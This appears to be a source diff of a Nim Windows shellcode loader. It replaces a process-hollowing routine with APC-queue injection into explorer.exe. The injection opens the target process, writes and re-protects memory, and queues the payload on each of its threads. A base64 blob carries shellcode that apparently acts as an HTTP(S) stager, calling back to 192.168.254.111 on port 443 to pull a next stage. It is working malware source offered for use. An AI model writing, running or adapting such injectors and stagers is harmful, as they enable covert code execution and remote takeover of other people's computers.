@@ -2,50 +2,44 @@ import base64, endians
 import winim
 import winim/lean
 
-type
-  PROCESSINFOCLASS {. pure .} = enum
-    ProcessBasicInformation = 0
-
-proc ZwQueryInformationProcess(
-  ProcessHandle: HANDLE,
-  ProcessInformationClass: PROCESSINFOCLASS,
-  ProcessInformation: PVOID,
-  ProcessInformationLength: ULONG,
-  ReturnLength: PULONG):
-  NTSTATUS
-  {.stdcall, dynlib: "ntdll", importc: "ZwQueryInformationProcess".}
+proc toString(chars: openArray[WCHAR]): string =
+    result = ""
+    for c in chars:
+        if cast[char](c) == '\0':
+            break
+        result.add(cast[char](c))
 
 
-proc process_hollowing[byte](shellcode: openArray[byte]): void =
+proc apc_queue[byte](shellcode: openArray[byte]): void =
+  var entry: PROCESSENTRY32
+  entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
+  var threadEntry: THREADENTRY32
+  threadEntry.dwSize = cast[DWORD](sizeof(THREADENTRY32))
+  var hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS or TH32CS_SNAPTHREAD, 0)
+  var targetHandle = hSnapshot
+  defer: CloseHandle(targetHandle)
   let processName = r"explorer.exe"
-  var 
-    si: STARTUPINFOEX
-    pi: PROCESS_INFORMATION
-    ps: SECURITY_ATTRIBUTES
-    ts: SECURITY_ATTRIBUTES
+  var processEntry: PROCESSENTRY32
+  if Process32First(hSnapshot, addr entry):
+    while Process32Next(hSnapshot, addr entry):
+      if entry.szExeFile.toString == processName:
+        processEntry = entry
   
-  CreateProcess(NULL, newWideCString(processName), ps, ts, TRUE, CREATE_SUSPENDED, NULL, NULL, addr si.StartupInfo, addr pi)
-  
-  var targetHandle = pi.hThread
-  var pHandle = pi.hProcess
-  var bi: PROCESS_BASIC_INFORMATION
-  var tmp: ULONG
-  discard ZwQueryInformationProcess(pHandle, PROCESSINFOCLASS.ProcessBasicInformation, addr bi, cast[ULONG](sizeof(bi)), addr tmp)
+  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID)
+  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READ_WRITE)
   var bytesWritten: SIZE_T
-  var baseAddressBytes: array[0..sizeof(PVOID), byte]
-  let ptrToImageBase = cast[PVOID](cast[int64](bi.PebBaseAddress) + 0x10)
-  ReadProcessMemory(pHandle, ptrToImageBase, addr baseAddressBytes, sizeof(PVOID), addr bytesWritten)
-  var data: array[0..0x200, byte]
-  let imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))
-  ReadProcessMemory(pHandle, imageBaseAddress, addr data, len(data), addr bytesWritten)
-  var e_lfanew: uint
-  littleEndian32(addr e_lfanew, addr data[0x3c])
-  var entrypointRvaOffset = e_lfanew + 0x28
-  var entrypointRva: uint
-  littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])
-  var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
-  WriteProcessMemory(pHandle, entrypointAddress, unsafeAddr shellcode, len(shellcode), addr bytesWritten)
-  ResumeThread(targetHandle)
+  WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
+  var op: DWORD
+  VirtualProtectEx(pHandle, rPtr, len(shellcode), PAGE_EXECUTE_READ, addr op)
+  var threadIds: seq[int] = @[]   
+  if Thread32First(hSnapshot, addr threadEntry):
+    while Thread32Next(hSnapshot, addr threadEntry):
+      if threadEntry.th32OwnerProcessID == processEntry.th32ProcessID:
+        threadIds.add(threadEntry.th32ThreadID)
+  for threadId in threadIds:
+    let tHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, cast[DWORD](threadId))
+    var apcRoutine = cast[PTHREAD_START_ROUTINE](rPtr)
+    QueueUserAPC(cast[PAPCFUNC](apcRoutine), tHandle, cast[ULONG_PTR](NULL))
   
 
 when isMainModule:
@@ -54,5 +48,5 @@ when isMainModule:
  
   let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8veTZEagA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzUuMCkNCgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWABBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTExAAAAAAA="
   let shellcode = toByteSeq(decode(enc))
-  process_hollowing(shellcode)
+  apc_queue(shellcode)
 
